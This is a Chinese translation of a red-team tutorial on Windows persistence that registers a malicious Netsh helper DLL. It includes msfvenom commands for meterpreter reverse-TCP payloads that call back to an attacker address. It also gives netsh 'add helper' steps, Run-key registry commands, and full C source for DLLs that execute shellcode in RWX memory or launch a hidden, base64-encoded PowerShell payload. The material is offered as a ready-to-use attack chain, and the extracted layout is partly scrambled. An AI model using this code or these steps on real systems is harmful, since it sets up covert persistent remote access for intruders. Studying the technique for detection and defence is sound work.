# Window权限维持（十）：Netsh Helper DLL

来源: 03-干货系列\Window权限维持整理\Window权限维持（十）：Netsh Helper DLL.pdf

Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的
Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红队可以使用此工具
来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特
权。
可以通过Metasploit Framework 的“ msfvenom ”实用程序生成任意DLL文件。
生成恶意DLL
可以通过Meterpreter的上载功能或命令和控制（C2）支持的任何其他文件传输功能将DLL文件传输到
目标主机。
上载恶意DLL
在“添加帮手”可以用来注册用的DLL “netsh的 ”实用工具。
添加助手DLL
每次netsh实用程序启动时，都会执行DLL，并且将建立通信。
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f 
dll > /tmp/pentestlab.dll
netsh
add helper path-to-malicious-dll

Netsh Helper DLL – Meterpreter
但是，默认情况下，netsh没有计划自动启动。创建将在Windows启动期间执行实用程序的注册表项将
在主机上创建持久性。这可以直接从Meterpreter会话或Windows Shell中完成。
创建注册表运行密钥
注册表运行键的替代方法是，可以使用多种其他方法来启动实用程序，例如创建服务或计划任务。
击败一家总部位于荷兰的IT安全公司，该公司率先在其Github存储库中发布概念证明DLL 。DLL是由
Marc Smeets用C编写的，可以对其进行修改以包含自定义的shellcode。Metasploit Framework实
用程序“ msfvenom ”可用于生成各种语言的shellcode。
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v 
Pentestlab /t REG_SZ /d "C:\Windows\SysWOW64\netsh"
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v 
pentestlab -d 'C:\Windows\SysWOW64\netsh'
msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp -b 
'\x00' -f c

C Shellcode – Netsh
可以将生成的shellcode注入到Netsh Helper DLL代码中。
#include <stdio.h>
#include <windows.h> // only required if you want to pop calc
 
#ifdef _M_X64
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb";
#else
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb";
#endif
 
// Start a separate thread so netsh remains useful.
DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{
    LPVOID newMemory;
    HANDLE currentProcess;
    SIZE_T bytesWritten;
    BOOL didWeCopy = FALSE;
    // Get the current process handle 
    currentProcess = GetCurrentProcess();
    // Allocate memory with Read+Write+Execute permissions 
    newMemory = VirtualAllocEx(currentProcess, NULL, sizeof(buf), MEM_COMMIT, 
PAGE_EXECUTE_READWRITE);
    if (newMemory == NULL)
        return -1;
    // Copy the shellcode into the memory we just created 
    didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&buf, 
sizeof(buf), &bytesWritten);
    if (!didWeCopy)
        return -2;

Netsh帮助程序DLL
与上述方法类似，rtcrowley在他的Github存储库中发布了该方法的PowerShell版本。以下代码可用
于执行PowerShell Base64编码的有效负载，并支持两个选项。
    // Yay! Let's run our shellcode! 
    ((void(*)())newMemory)();
    return 1;
}
 
// define the DLL handler 'InitHelpderDll' as required by netsh.
// See https://msdn.microsoft.com/en-
us/library/windows/desktop/ms708327(v=vs.85).aspx
extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID 
pReserved)
{
    //make a thread handler, start the function as a thread, and close the 
handler 
    HANDLE threadHandle;
    threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
    CloseHandle(threadHandle);
    // simple testing by starting calculator
    system ("start calc");
 
    // return NO_ERROR is required. Here we are doing it the nasty way
    return 0;
}
#include <stdio.h>
#include <windows.h>

 
DWORD WINAPI YahSure(LPVOID lpParameter)
{
    //Option 1: Quick and simple. Opens 1 PS proc & briefly displays window. Set 
payload to b64 unicode.
    system("start C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 
-win hidden -nonI -nopro -enc \
                
SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBpAG8ATgAuACYA
IAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==");
 
    //Option 2: Execute loaded b64 into a reg key value. Will spin up a few etra 
procs, but will not open an extra window.
    //system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c 
\
            $x=((gp HKLM:SOFTWARE\\Microsoft\\Notepad debug).debug); \
                powershell -nopro -enc $x 2> nul");
    return 1;
 
}
 
//Custom netsh helper format
extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID 
pReserved)
{
    HANDLE hand;
    hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);
    CloseHandle(hand);
 
    return NO_ERROR;
}

Netsh Helper DLL – PowerShell方法
执行“ netsh ”实用程序并使用“ add helper ”命令加载系统中的两个DLL都将执行集成的有效负载。
Netsh助手DLL
Empire和Metasploit的“ multi / handler ”模块可用于接收来自两个DLL的通信。
Netsh助手DLL PowerShell
Netsh助手DLL Meterpreter
当执行“ 添加帮助程序 ”命令以加载DLL文件时，将在以下位置创建注册表项。
netsh
add helper C:\Users\pentestlab\Desktop\NetshHelperBeacon.dll
add helper C:\Users\pentestlab\Desktop\NetshPowerShell.dll
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh

Netsh注册表项
应该注意的是，某些可能安装在受感染系统上的VPN客户端可能会自动“ netsh ” 启动，因此可能不需
要使用其他方法进行持久化。
 
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/
 
